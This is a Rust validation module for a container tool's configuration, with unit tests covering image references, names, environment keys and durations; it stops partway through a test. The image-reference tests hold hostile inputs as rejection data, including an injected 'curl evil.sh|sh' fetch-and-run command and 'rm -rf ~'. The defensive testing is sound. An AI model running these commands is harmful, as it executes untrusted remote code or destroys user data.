use anyhow::Result;

mod caches;

use crate::config::Config;
use crate::error::PodboxError;

impl Config {
    pub fn validate(&self) -> Result<()> {
        let validated = self.validate_with_warnings();
        // The wasm/Studio path uses `validate_with_warnings` directly: the
        // print macros panic on wasm targets, so only the CLI may print.
        #[cfg(feature = "cli")]
        for warning in &validated.0 {
            eprintln!("{warning}");
        }
        validated.1
    }

    /// Validate, collecting non-fatal diagnostics alongside the verdict.
    /// Warnings are produced independently of the error outcome, matching
    /// the CLI (which prints them even when validation fails).
    pub fn validate_with_warnings(&self) -> (Vec<String>, Result<()>) {
        let mut warnings: Vec<String> = Vec::new();
        let mut errors: Vec<String> = Vec::new();

        if self.image.base.trim().is_empty() {
            errors.push("image.base: must not be empty".into());
        } else if !is_valid_image_ref(&self.image.base) {
            errors.push(format!(
                "image.base: '{}' is not a valid image reference (expected [registry/]name[:tag], no spaces or shell characters)",
                self.image.base
            ));
        }
        if self.image.name.trim().is_empty() {
            errors.push("image.name: must not be empty".into());
        } else if let Err(e) = validate_container_name("image", &self.image.name) {
            errors.push(format!("image.name: {e}"));
        } else if !is_lowercase_image_name(&self.image.name) {
            errors.push(format!(
                "image.name: '{}' must be lowercase (podman rejects uppercase image repository names)",
                self.image.name
            ));
        }
        if let Some(ref r) = self.image.image_ref {
            if r.trim().is_empty() {
                errors.push("image.image: must not be empty when set".into());
            } else if !is_valid_image_ref(r) {
                errors.push(format!(
                    "image.image: '{r}' is not a valid image reference (expected [registry/]name[:tag][@sha256:<digest>], no spaces or shell characters)"
                ));
            }
        }

        if self.container.name.trim().is_empty() {
            errors.push("container.name: must not be empty".into());
        } else if let Err(e) = validate_container_name("container", &self.container.name) {
            errors.push(format!("container.name: {e}"));
        }
        if self.container.home.as_os_str().is_empty() {
            errors.push("container.home: must not be empty".into());
        }
        if self.container.shell.trim().is_empty() {
            errors.push("container.shell: must not be empty".into());
        }
        if self.container.slice.trim().is_empty() || self.container.slice.contains('\n') {
            errors.push("container.slice: must be a non-empty systemd slice name".into());
        }
        if !(1..=10_000).contains(&self.container.cpu_weight) {
            errors.push("container.cpu_weight: must be between 1 and 10000".into());
        }
        if let Some(dotfiles) = &self.dotfiles {
            if dotfiles.source.trim().is_empty() {
                errors.push("dotfiles.source: must not be empty".into());
            } else if dotfiles.source == "host:" {
                errors.push("dotfiles.source: host: must be followed by a directory path".into());
            }
            if dotfiles.target.trim().is_empty() {
                errors.push("dotfiles.target: must not be empty".into());
            } else {
                let target = if dotfiles.target == "~" {
                    ""
                } else {
                    dotfiles
                        .target
                        .strip_prefix("~/")
                        .unwrap_or(&dotfiles.target)
                };
                let path = std::path::Path::new(target);
                if path.is_absolute()
                    || (target.starts_with('~')
                        && dotfiles.target != "~"
                        && !dotfiles.target.starts_with("~/"))
                    || path.components().any(|part| {
                        matches!(
                            part,
                            std::path::Component::ParentDir | std::path::Component::RootDir
                        )
                    })
                {
                    errors.push(
                        "dotfiles.target: must be a path inside the container home (for example '~/.dotfiles')".into(),
                    );
                }
            }
            if dotfiles
                .install
                .as_ref()
                .is_some_and(|cmd| cmd.trim().is_empty())
            {
                errors.push("dotfiles.install: must not be empty when set".into());
            }
        }
        if let Some(ref mem) = self.container.memory {
            if !is_valid_memory(mem) {
                errors.push(format!(
                    "container.memory: '{mem}' is not a valid memory limit (e.g. '2g', '512m')"
                ));
            }
        }
        if let Some(ref cpus) = self.container.cpus {
            // `NaN`/`inf` parse as f64 but are meaningless as CPU counts;
            // without the finiteness check they sailed through to
            // `PodmanArgs=--cpus=NaN`.
            let valid = cpus
                .parse::<f64>()
                .is_ok_and(|v| v.is_finite() && v > 0.0 && v <= MAX_CPUS);
            if !valid {
                errors.push(format!(
                    "container.cpus: '{cpus}' is not a valid CPU count (e.g. '2.0', '0.5')"
                ));
            }
        }
        for (i, mount) in self.container.mounts.extra.iter().enumerate() {
            if !mount.contains(':') {
                errors.push(format!(
                    "container.mounts.extra[{i}]: '{mount}' missing ':' separator (expected host:container[:options])"
                ));
            }
        }
        for (key, val) in &self.container.env.values {
            if !is_valid_env_key(key) {
                errors.push(format!(
                    "container.env: invalid key '{key}' (use ^[A-Za-z_][A-Za-z0-9_]*$)"
                ));
            }
            if key.contains('\n') {
                errors.push(format!("container.env: key {key:?} contains newline"));
            }
            if val.contains('\n') {
                errors.push(format!("container.env: value for {key:?} contains newline"));
            }
        }
        // Every other string field that reaches a unit line or a Containerfile
        // RUN layer must not carry NUL/CR/LF: a newline would inject an extra
        // directive (or a bogus build instruction), and codegen refuses to
        // emit such values. Each violation names its field path.
        {
            let mut fields: Vec<(String, &str)> = Vec::new();
            for (i, dep) in self.systemd.requires.iter().enumerate() {
                fields.push((format!("systemd.requires[{i}]"), dep));
            }
            for (i, dep) in self.systemd.after.iter().enumerate() {
                fields.push((format!("systemd.after[{i}]"), dep));
            }
            if let Some(ref cmd) = self.container.reload_cmd {
                fields.push(("container.reload_cmd".into(), cmd));
            }
            for (i, cap) in self.security.cap_add.iter().enumerate() {
                fields.push((format!("security.cap_add[{i}]"), cap));
            }
            if let Some(ref profile) = self.security.seccomp {
                fields.push(("security.seccomp".into(), profile));
            }
            if let Some(ref profile) = self.security.apparmor {
                fields.push(("security.apparmor".into(), profile));
            }
            for (i, mount) in self.container.mounts.extra.iter().enumerate() {
                fields.push((format!("container.mounts.extra[{i}]"), mount));
            }
            for (i, cmd) in self.image.run.commands.iter().enumerate() {
                fields.push((format!("image.run.commands[{i}]"), cmd));
            }
            for (i, pkg) in self.image.packages.install.iter().enumerate() {
                fields.push((format!("image.packages.install[{i}]"), pkg));
            }
            for (i, entry) in self.security.secrets.iter().enumerate() {
                let (name, target, mode) = match entry {
                    crate::config::SecretEntry::Simple(name) => (name, None, None),
                    crate::config::SecretEntry::Detailed {
                        name, target, mode, ..
                    } => (name, target.as_ref(), mode.as_ref()),
                };
                fields.push((format!("security.secrets[{i}].name"), name));
                if let Some(t) = target {
                    fields.push((format!("security.secrets[{i}].target"), t));
                }
                if let Some(m) = mode {
                    fields.push((format!("security.secrets[{i}].mode"), m));
                }
            }
            for (i, svc) in self.dbus.talk.iter().enumerate() {
                fields.push((format!("dbus.talk[{i}]"), svc));
            }
            for (i, svc) in self.dbus.own.iter().enumerate() {
                fields.push((format!("dbus.own[{i}]"), svc));
            }
            for (i, port) in self.network.ports.iter().enumerate() {
                fields.push((format!("network.ports[{i}]"), port));
            }
            fields.push(("image.base".into(), &self.image.base));
            if let Some(ref image_ref) = self.image.image_ref {
                fields.push(("image.image".into(), image_ref));
            }
            fields.push((
                "image.pull_retry_delay".into(),
                &self.image.pull_retry_delay,
            ));
            fields.push(("container.shell".into(), &self.container.shell));
            for (path, value) in &fields {
                if value.chars().any(|c| matches!(c, '\0' | '\n' | '\r')) {
                    errors.push(format!(
                        "{path}: must not contain NUL, carriage return, or newline"
                    ));
                }
            }
        }
        errors.extend(validate_provision(&self.provision));
        errors.extend(caches::validate_caches(self));
        for (i, pattern) in self.container.env.forward.iter().enumerate() {
            // A trailing `*` marks a prefix forward (`FOO_*`); the key
            // itself must still be a valid env name.
            let key = pattern.strip_suffix('*').unwrap_or(pattern);
            if !is_valid_env_key(key) {
                errors.push(format!(
                    "container.env.forward[{i}]: '{pattern}' must be an environment key or PREFIX_*"
                ));
            }
        }
        for (name, service) in &self.container.services {
            let valid_name = !name.is_empty()
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
            if !valid_name {
                errors.push(format!("container.services: invalid service name '{name}'"));
            }
            let (command, env) = match service {
                crate::config::ServiceConfig::Short(command) => (command, None),
                crate::config::ServiceConfig::Detailed(detail) => {
                    (&detail.command, Some(&detail.env))
                }
            };
            if command.trim().is_empty() {
                errors.push(format!(
                    "container.services.{name}.command: must not be empty"
                ));
            }
            // `restart` is a `ServiceRestart` enum: unknown spellings fail
            // at parse time with the valid list, so there is nothing to
            // re-check here.
            if let Some(values) = env {
                for (key, value) in values {
                    if !is_valid_env_key(key)
                        || value.chars().any(|c| matches!(c, '\0' | '\n' | '\r'))
                    {
                        errors.push(format!(
                            "container.services.{name}.env: invalid environment entry '{key}'"
                        ));
                    }
                }
            }
        }

        // `security.userns` is a `UsernsMode` enum: unknown spellings fail
        // at parse time with the valid list, so there is nothing to
        // re-check here.

        // Network validation. `network.mode` is a `NetworkMode` enum:
        // unknown spellings fail at parse time with the valid list.
        if self.network.effective_mode() == crate::config::NetworkMode::None
            && !self.network.ports.is_empty()
        {
            errors.push(
                "network.ports: cannot publish ports when network mode is none/offline".into(),
            );
        }

        for (i, port) in self.network.ports.iter().enumerate() {
            if !port.contains(':') {
                errors.push(format!(
                    "network.ports[{i}]: '{port}' is invalid (expected 'hostPort:containerPort' or 'ip:hostPort:containerPort')"
                ));
            }
        }

        if let Some(ref map) = self.integration.host_exec.allowlist {
            for (alias, entry) in map {
                let path = entry.path();
                if !is_absolute_path(path) {
                    errors.push(format!(
                        "integration.host_exec.allowlist.{alias}: path '{path}' is not absolute (must start with '/')"
                    ));
                }
                if alias.is_empty()
                    || alias.contains('/')
                    || alias.contains("..")
                    || alias.contains('\0')
                {
                    errors.push(format!(
                        "integration.host_exec.allowlist: alias '{alias}' is invalid (must not contain '/' or '..')"
                    ));
                }
                const RESERVED: &[&str] = &[
                    "podbox-guest",
                    "podmgr-guest",
                    "host-exec",
                    "notify-send",
                    "xdg-open",
                    "podbox-clipboard",
                    "podmgr-clipboard",
                ];
                if RESERVED.contains(&alias.as_str()) {
                    errors.push(format!(
                        "integration.host_exec.allowlist: alias '{alias}' is reserved"
                    ));
                }
            }
        }

        // systemd-credential secrets become LoadCredential= names and
        // /run/secrets/<name> file names: reject path separators and
        // parent references, require the host-side path, and require a
        // valid variable name when the target becomes Environment=KEY=….
        for (i, entry) in self.security.secrets.iter().enumerate() {
            let (name, secret_type, target, source, path) = match entry {
                crate::config::SecretEntry::Simple(name) => (
                    name,
                    &crate::config::SecretType::Env,
                    None,
                    &crate::config::SecretSource::Podman,
                    None,
                ),
                crate::config::SecretEntry::Detailed {
                    name,
                    secret_type,
                    target,
                    source,
                    path,
                    ..
                } => (name, secret_type, target.as_ref(), source, path.as_ref()),
            };
            let prefix = format!("security.secrets[{i}]");
            if name.is_empty()
                || name.contains('/')
                || name.contains('\\')
                || name.split('/').any(|part| part == "..")
            {
                errors.push(format!(
                    "{prefix}.name: '{name}' is not a safe credential filename (no '/', '\\\\' or '..')"
                ));
            }
            if *source == crate::config::SecretSource::Systemd {
                match path {
                    Some(p) if !p.trim().is_empty() => {}
                    _ => errors.push(format!(
                        "{prefix}.path: required with source = \"systemd\" (host-side credential file)"
                    )),
                }
                if *secret_type == crate::config::SecretType::Env
                    && let Some(t) = target
                    && !is_valid_env_key(t)
                {
                    errors.push(format!(
                        "{prefix}.target: '{t}' must be a valid environment variable name"
                    ));
                }
            }
        }

        // Packages need a package manager: an undetectable image family
        // with install entries would otherwise silently emit the wrong
        // install command (dnf on Arch). Fail with the fix attached.
        if !self.image.packages.install.is_empty()
            && crate::codegen::distros::family_for_config(self)
                == crate::codegen::distros::DistroFamily::Unknown
        {
            let image = self.image.image_ref.as_deref().unwrap_or(&self.image.base);
            errors.push(format!(
                "image.packages: cannot determine package manager for '{image}'; set image.packages.manager explicitly (\"apt\", \"dnf\", \"pacman\", \"apk\" or \"zypper\")"
            ));
        }

        // `lifecycle.on_stop` is deprecated: Quadlet runs containers with
        // `--rm --replace`, so every box is ephemeral and there is nothing to
        // keep. Warn when set explicitly, but keep parsing it.
        if self.explicit_keys.contains("lifecycle.on_stop") {
            warnings.push(
                "warning: lifecycle.on_stop is deprecated and has no effect: Quadlet containers \
                 are always ephemeral; state lives in the home volume and snapshots."
                    .into(),
            );
        }

        if self.integration.host_exec.enabled {
            let has_allowlist = self
                .integration
                .host_exec
                .allowlist
                .as_ref()
                .is_some_and(|m| !m.is_empty());
            if !has_allowlist {
                errors.push(
                    "integration.host_exec: 'enabled' is true, but 'allowlist' is missing or empty. \
                     For security, legacy open execution is blocked; you must explicitly define \
                     allowed host commands."
                        .into(),
                );
            }
        }

        for svc in &self.dbus.talk {
            if is_portal_family(svc) {
                warnings.push(format!(
                    "warning: dbus.talk entry '{svc}' grants the container access to the full \
                     xdg-desktop-portal bus surface (DynamicLauncher, Screenshot, ScreenCast, \
                     Settings, ...). Prefer relying on the built-in interface-scoped portal rules \
                     from integration.notify / integration.xdg_open instead."
                ));
            }
        }

        // D-Bus rules without the bus itself are dead config: with
        // `integration.dbus` off the container gets no D-Bus at all, so talk,
        // own, or a preset would be silently ignored. Fail fast instead.
        if !self.integration.dbus
            && (!self.dbus.talk.is_empty()
                || !self.dbus.own.is_empty()
                || self.dbus.preset != crate::config::DbusPreset::None)
        {
            errors.push(
                "dbus: talk/own/preset rules are set but 'integration.dbus' is false, \
                 so the container would get no D-Bus at all. Set 'integration.dbus = true' \
                 to apply them."
                    .into(),
            );
        }

        let t = &self.lifecycle.idle_timeout;
        if t != "off" {
            if let Err(e) = parse_duration_secs(t) {
                errors.push(format!(
                    "lifecycle.idle_timeout: '{t}' is invalid ({e}; expected 'off', '30s', '5m', '1h')"
                ));
            }
        }
        if let Err(e) = parse_duration_secs(&self.image.pull_retry_delay) {
            errors.push(format!(
                "image.pull_retry_delay: '{}' is invalid ({e}; expected e.g. '5s')",
                self.image.pull_retry_delay
            ));
        }

        if errors.is_empty() {
            (warnings, Ok(()))
        } else {
            (
                warnings,
                Err(PodboxError::ConfigValidationFailed {
                    details: errors.join("\n  - "),
                }
                .into()),
            )
        }
    }
}

/// Longest accepted container, image, profile, or tag name.
const MAX_NAME_LEN: usize = 63;

/// Validate a name that becomes a file name, a systemd unit name, or a podman
/// argument. `kind` labels the error (`"container"`, `"profile"`, ...).
///
/// Accepts `[A-Za-z0-9][A-Za-z0-9_.-]{0,62}`. Requiring an alphanumeric first
/// character rules out `.` and `..` (path traversal when the name is joined
/// onto a directory), hidden names, and a leading `-` (which podman would read
/// as a flag). Path separators, NUL and whitespace are rejected everywhere.
pub fn validate_container_name(kind: &'static str, name: &str) -> Result<(), PodboxError> {
    let mut chars = name.chars();
    let first_ok = chars.next().is_some_and(|c| c.is_ascii_alphanumeric());
    let rest_ok = chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'));
    if first_ok && rest_ok && name.len() <= MAX_NAME_LEN {
        Ok(())
    } else {
        Err(PodboxError::InvalidName {
            kind,
            name: name.to_string(),
        })
    }
}

/// Podman rejects uppercase image repository names, so `image.name` must be
/// lowercase. Container names keep their case; only the image repo is checked.
pub fn is_lowercase_image_name(name: &str) -> bool {
    !name.chars().any(|c| c.is_ascii_uppercase())
}

fn is_absolute_path(s: &str) -> bool {
    s.starts_with('/')
}

/// True when `svc` names the xdg-desktop-portal bus surface (the Desktop
/// service itself or anything under its name prefix).
fn is_portal_family(svc: &str) -> bool {
    svc == "org.freedesktop.portal.Desktop"
        || svc.starts_with("org.freedesktop.portal")
        || svc.starts_with("org.freedesktop.impl.portal")
}

/// Upper bound for `container.cpus`: far above any real host, but finite so
/// typos like `99999` fail fast instead of producing a puzzling runtime error.
const MAX_CPUS: f64 = 1024.0;

/// Parse a duration string (`30s`, `5m`, `1h`, `500ms`) into whole seconds.
///
/// The whole string must be consumed: leading/trailing junk (`5mx`, `m5`,
/// empty) is an error, not silently ignored. Sub-second values truncate
/// toward zero, so callers that need a positive duration keep rejecting
/// them via the `0` they produce.
pub fn parse_duration_secs(s: &str) -> Result<u64> {
    let trimmed = s.trim();
    if trimmed.is_empty() {
        anyhow::bail!("empty duration (expected e.g. '30s', '5m', '1h')");
    }
    let digits: String = trimmed.chars().take_while(|c| c.is_ascii_digit()).collect();
    if digits.is_empty() {
        anyhow::bail!("'{s}' does not start with a number (expected e.g. '30s', '5m', '1h')");
    }
    let rest = &trimmed[digits.len()..];
    let value: u64 = digits
        .parse()
        .map_err(|_| anyhow::anyhow!("'{s}' is not a valid duration"))?;
    let secs = match rest {
        "ms" => value / 1000,
        "s" => value,
        "m" => value.saturating_mul(60),
        "h" => value.saturating_mul(3600),
        _ => {
            anyhow::bail!(
                "'{s}' has trailing characters after the duration (expected a single 's', 'm', 'h' or 'ms' suffix)"
            );
        }
    };
    if secs == 0 {
        anyhow::bail!("'{s}' is not a positive duration (expected e.g. '30s', '5m', '1h')");
    }
    Ok(secs)
}

/// Convert an idle_timeout config string to seconds.
/// Returns 0 for "off".
pub fn parse_idle_timeout_secs(s: &str) -> u64 {
    if s == "off" {
        return 0;
    }
    parse_duration_secs(s).unwrap_or(0)
}

pub fn is_valid_memory(s: &str) -> bool {
    let s = s.trim();
    if s.is_empty() {
        return false;
    }
    let digits: String = s.chars().take_while(|c| c.is_ascii_digit()).collect();
    let suffix: String = s.chars().skip(digits.len()).collect();
    if digits.is_empty() {
        return false;
    }
    matches!(
        suffix.as_str(),
        "k" | "K" | "m" | "M" | "g" | "G" | "t" | "T"
    )
}

pub fn is_bare_memory_digits(s: &str) -> bool {
    let t = s.trim();
    !t.is_empty() && t.chars().all(|c| c.is_ascii_digit())
}

/// Parse a provision `timeout` (`30s`, `5m`, `1h`) into seconds.
/// Returns 0 when invalid or non-positive (callers treat 0 as invalid).
pub fn parse_provision_timeout_secs(s: &str) -> u64 {
    parse_duration_secs(s).unwrap_or(0)
}

/// True for a well-formed OCI image reference:
/// `[domain/]path[:tag][@sha256:<64 hex>]`.
///
/// Whitespace and shell metacharacters are rejected outright, so a
/// crafted value (for example from a share link) can never flow into a
/// shell command or a podman argument. Repository paths are lowercase,
/// matching what registries accept.
pub fn is_valid_image_ref(s: &str) -> bool {
    if s.is_empty() || s.len() > 512 {
        return false;
    }
    if !s
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@'))
    {
        return false;
    }
    // Digest: at most one `@`, of the form `sha256:<64 hex>`.
    let (rem, digest) = match s.split_once('@') {
        Some((r, d)) => (r, Some(d)),
        None => (s, None),
    };
    if let Some(d) = digest {
        let hex = match d.strip_prefix("sha256:") {
            Some(h) => h,
            None => return false,
        };
        if hex.len() != 64 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
            return false;
        }
    }
    if rem.is_empty() {
        return false;
    }
    // Tag: the colon after the last slash (a `host:port/` prefix is not a
    // tag). `[\w][\w.-]{0,127}` like the registry grammar.
    let (name, tag) = match rem.rfind('/') {
        Some(slash) => {
            let after = &rem[slash + 1..];
            match after.find(':') {
                Some(i) => (&rem[..slash + 1 + i], Some(&after[i + 1..])),
                None => (rem, None),
            }
        }
        None => match rem.find(':') {
            Some(i) => (&rem[..i], Some(&rem[i + 1..])),
            None => (rem, None),
        },
    };
    if let Some(t) = tag {
        let mut chars = t.chars();
        let first_ok = chars
            .next()
            .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_');
        if !first_ok
            || t.len() > 128
            || !chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'))
        {
            return false;
        }
    }
    // Name: optional registry domain, then repository path components.
    let mut parts = name.split('/');
    let first = parts.next().unwrap_or_default();
    let rest: Vec<&str> = parts.collect();
    if first.contains('.') || first.contains(':') || first == "localhost" {
        if rest.is_empty() || !is_valid_registry_domain(first) {
            return false;
        }
    } else if !is_valid_path_component(first) {
        return false;
    }
    rest.iter().all(|p| is_valid_path_component(p))
}

/// Registry host with an optional numeric port: lowercase DNS plus dots
/// and dashes (`ghcr.io`, `localhost:5000`).
fn is_valid_registry_domain(s: &str) -> bool {
    let (host, port) = match s.split_once(':') {
        Some((h, p)) => (h, Some(p)),
        None => (s, None),
    };
    if host.is_empty()
        || host.starts_with(['.', '-'])
        || host.ends_with(['.', '-'])
        || host.split('.').any(str::is_empty)
        || !host
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '.' || c == '-')
    {
        return false;
    }
    if let Some(p) = port {
        if p.is_empty() || !p.chars().all(|c| c.is_ascii_digit()) {
            return false;
        }
    }
    true
}

/// One repository path component: lowercase alphanumerics separated by
/// single `.`, `_` or `-` (no leading/trailing/double separators).
fn is_valid_path_component(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    let bytes = s.as_bytes();
    if !bytes[0].is_ascii_alphanumeric() || !bytes[bytes.len() - 1].is_ascii_alphanumeric() {
        return false;
    }
    let mut prev_sep = false;
    for c in s.chars() {
        if c.is_ascii_lowercase() || c.is_ascii_digit() {
            prev_sep = false;
        } else if c == '.' || c == '_' || c == '-' {
            if prev_sep {
                return false;
            }
            prev_sep = true;
        } else {
            return false;
        }
    }
    true
}

fn is_valid_provision_name(s: &str) -> bool {
    if s.is_empty() || s.len() > 64 {
        return false;
    }
    let mut chars = s.chars();
    let first = chars.next().unwrap();
    if !(first.is_ascii_lowercase() || first.is_ascii_digit()) {
        return false;
    }
    s.chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-' || c == '_')
}

/// True for `^[A-Za-z_][A-Za-z0-9_]*$`: the single environment-name rule
/// used by every env-bearing field (`container.env`, forwards, service and
/// provision env, systemd secret targets). Codegen no longer re-checks
/// names; validation rejects them with a field path instead.
pub fn is_valid_env_key(s: &str) -> bool {
    if s.is_empty() {
        return false;
    }
    let mut chars = s.chars();
    let first = chars.next().unwrap();
    if !(first.is_ascii_alphabetic() || first == '_') {
        return false;
    }
    s.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn validate_provision(steps: &[crate::config::types::ProvisionStep]) -> Vec<String> {
    let mut errors: Vec<String> = Vec::new();
    if steps.len() > 64 {
        errors.push(format!(
            "provision: too many steps ({}) — at most 64",
            steps.len()
        ));
        return errors;
    }
    let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
    for (i, step) in steps.iter().enumerate() {
        let prefix = format!("provision[{i}]");
        if step.name == "dotfiles" {
            errors.push(format!("{prefix}.name: 'dotfiles' is reserved"));
        } else if !is_valid_provision_name(&step.name) {
            errors.push(format!(
                "{prefix}.name: '{}' is invalid (use ^[a-z0-9][a-z0-9_-]{{0,63}}$)",
                step.name
            ));
        }
        if !seen.insert(step.name.as_str()) {
            errors.push(format!(
                "{prefix}.name: duplicate step name '{}'",
                step.name
            ));
        }
        if step.run.trim().is_empty() {
            errors.push(format!("{prefix}.run: must not be empty"));
        }
        if parse_provision_timeout_secs(&step.timeout) == 0 {
            errors.push(format!(
                "{prefix}.timeout: '{}' is invalid (expected e.g. '30s', '5m', '1h', > 0)",
                step.timeout
            ));
        }
        for (key, value) in &step.env {
            if !is_valid_env_key(key) {
                errors.push(format!(
                    "{prefix}.env: invalid key '{key}' (use ^[A-Za-z_][A-Za-z0-9_]*$)"
                ));
            } else if key.starts_with("PODBOX_") {
                errors.push(format!(
                    "{prefix}.env: key '{key}' is reserved (PODBOX_ prefix)"
                ));
            }
            if value.chars().any(|c| matches!(c, '\0' | '\n' | '\r')) {
                errors.push(format!(
                    "{prefix}.env: value for '{key}' contains newline or NUL"
                ));
            }
        }
    }
    errors
}

#[cfg(test)]
mod name_tests {
    use super::{is_lowercase_image_name, validate_container_name};

    #[test]
    fn image_names_must_be_lowercase() {
        assert!(is_lowercase_image_name("dev-box_2"));
        assert!(!is_lowercase_image_name("Dev"));
        // Container names may keep their case.
        assert!(validate_container_name("container", "Dev").is_ok());
    }

    #[test]
    fn rejects_names_unsafe_as_paths_or_flags() {
        for bad in [
            ".",
            "..",
            "-x",
            "a/b",
            "",
            "a b",
            ".hidden",
            "a\0b",
            "tab\tname",
        ] {
            assert!(
                validate_container_name("container", bad).is_err(),
                "should reject {bad:?}"
            );
        }
    }

    #[test]
    fn accepts_ordinary_names() {
        for good in ["dev", "my-box_2", "a.b", "a..b", "Work", "9lives"] {
            assert!(
                validate_container_name("container", good).is_ok(),
                "should accept {good:?}"
            );
        }
    }

    #[test]
    fn enforces_length_limit() {
        assert!(validate_container_name("container", &"a".repeat(63)).is_ok());
        assert!(validate_container_name("container", &"a".repeat(64)).is_err());
    }
}

#[cfg(test)]
mod numeric_duration_tests {
    use super::parse_duration_secs;
    use crate::config::Config;

    fn minimal(image_extra: &str, container_extra: &str, tail: &str) -> String {
        format!(
            "[image]\nbase = \"fedora:41\"\nname = \"env\"\n{image_extra}\
             [container]\nname = \"env\"\nhome = \"~/env\"\n{container_extra}\
             {tail}\n"
        )
    }

    #[test]
    fn valid_durations_parse() {
        assert_eq!(parse_duration_secs("90s").unwrap(), 90);
        assert_eq!(parse_duration_secs("5m").unwrap(), 300);
        assert_eq!(parse_duration_secs("1h").unwrap(), 3600);
        assert_eq!(parse_duration_secs(" 10s ").unwrap(), 10);
    }

    #[test]
    fn trailing_junk_and_empty_are_rejected() {
        for bad in ["5mx", "m5", "", "off", "5", "0s", "500ms", "-5s"] {
            assert!(parse_duration_secs(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn non_finite_and_non_positive_cpus_are_rejected() {
        for bad in ["NaN", "inf", "-inf", "-1", "0", "0.0", "999999"] {
            let err = Config::parse(&minimal("", &format!("cpus = \"{bad}\"\n"), ""))
                .expect_err(&format!("cpus = {bad:?} must fail validation"));
            assert!(
                err.to_string().contains("container.cpus"),
                "error should name the field: {err}"
            );
        }
    }

    #[test]
    fn ordinary_cpus_are_accepted() {
        for good in ["2.0", "0.5", "16"] {
            Config::parse(&minimal("", &format!("cpus = \"{good}\"\n"), ""))
                .unwrap_or_else(|_| panic!("cpus = {good:?} should validate"));
        }
    }

    #[test]
    fn idle_timeout_with_trailing_junk_is_rejected() {
        let err = Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5mx\"\n"))
            .expect_err("idle_timeout with trailing junk must fail");
        assert!(err.to_string().contains("lifecycle.idle_timeout"), "{err}");
        Config::parse(&minimal("", "", "[lifecycle]\nidle_timeout = \"5m\"\n"))
            .expect("a plain duration should validate");
    }

    #[test]
    fn pull_retry_delay_is_duration_checked() {
        let err = Config::parse(&minimal("pull_retry_delay = \"5x\"\n", "", ""))
            .expect_err("pull_retry_delay with bad suffix must fail");
        assert!(err.to_string().contains("image.pull_retry_delay"), "{err}");
    }
}

#[cfg(test)]
mod env_key_tests {
    use super::is_valid_env_key;
    use crate::config::Config;

    fn base() -> String {
        "[image]\nbase = \"fedora:41\"\nname = \"env\"\n\
         [container]\nname = \"env\"\nhome = \"~/env\"\n"
            .to_string()
    }

    #[test]
    fn key_grammar() {
        for bad in ["1ABC", "A-B", "Ä", "", "A B", "A=B"] {
            assert!(!is_valid_env_key(bad), "should reject {bad:?}");
        }
        for good in ["_A1", "PATH", "_", "A1_b2"] {
            assert!(is_valid_env_key(good), "should accept {good:?}");
        }
    }

    #[test]
    fn container_env_values_are_checked() {
        let err = Config::parse(&(base() + "[container.env]\n1ABC = \"x\"\n"))
            .expect_err("bad container.env key must fail");
        assert!(err.to_string().contains("container.env"), "{err}");
    }

    #[test]
    fn container_env_forward_patterns_are_checked() {
        let err = Config::parse(&(base() + "[container.env]\nforward = [\"1ABC\"]\n"))
            .expect_err("bad forward pattern must fail");
        assert!(err.to_string().contains("container.env.forward"), "{err}");
        Config::parse(&(base() + "[container.env]\nforward = [\"FOO_*\"]\n"))
            .expect("PREFIX_* forwards should validate");
    }

    #[test]
    fn service_env_is_checked() {
        let err = Config::parse(
            &(base()
                + "[container.services.web]\ncommand = \"x\"\n[container.services.web.env]\nA-B = \"x\"\n"),
        )
        .expect_err("bad service env key must fail");
        assert!(
            err.to_string().contains("container.services.web.env"),
            "{err}"
        );
    }

    #[test]
    fn provision_env_is_checked() {
        let err = Config::parse(
            &(base() + "[[provision]]\nname = \"step\"\nrun = \"echo\"\n[provision.env]\n\"Ä\" = \"x\"\n"),
        )
        .expect_err("bad provision env key must fail");
        assert!(err.to_string().contains("provision[0].env"), "{err}");
    }

    #[test]
    fn systemd_secret_targets_are_checked() {
        let err = Config::parse(
            &(base()
                + "[[security.secrets]]\nname = \"tok\"\nsource = \"systemd\"\npath = \"/run/x\"\ntype = \"env\"\ntarget = \"1ABC\"\n"),
        )
        .expect_err("bad secret target must fail");
        assert!(
            err.to_string().contains("security.secrets[0].target"),
            "{err}"
        );
    }
}

#[cfg(test)]
mod image_ref_tests {
    use super::is_valid_image_ref;
    use crate::config::Config;

    #[test]
    fn valid_refs_are_accepted() {
        for good in [
            "fedora:41",
            "fedora",
            "dev-latest",
            "ubuntu:22.04",
            "ghcr.io/bethropolis/podbox:dev-latest",
            "ghcr.io/a/b:1",
            "localhost:5000/mybox:latest",
            "docker.io/library/archlinux:latest",
            "alpine:3.20",
            "myrepo/myimage@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "ghcr.io/a/b:1@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
        ] {
            assert!(is_valid_image_ref(good), "should accept {good:?}");
        }
    }

    #[test]
    fn shell_characters_and_malformed_refs_are_rejected() {
        for bad in [
            "",
            " ",
            "ghcr.io/a/b:1 --name x; curl evil.sh|sh #",
            "a;rm -rf ~",
            "$(evil)",
            "`evil`",
            "a'b",
            "a\"b",
            "a/b\\c",
            "UPPER/repo:tag",
            "a//b",
            "/a",
            "a/",
            ":tag",
            "a:",
            "-bad/x",
            "a:b:c",
            "a@sha256:xyz",
            "a@md5:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
            "a..b/c",
        ] {
            assert!(!is_valid_image_ref(bad), "should reject {bad:?}");
        }
    }

    #[test]
    fn crafted_share_link_ref_fails_validation() {
        let toml = "[image]\nbase = \"fedora:41\"\nname = \"env\"\nimage = \"ghcr.io/a/b:1 --name x; curl evil.sh|sh #\"\n[container]\nname = \"env\"\nhome = \"~/env\"\n";
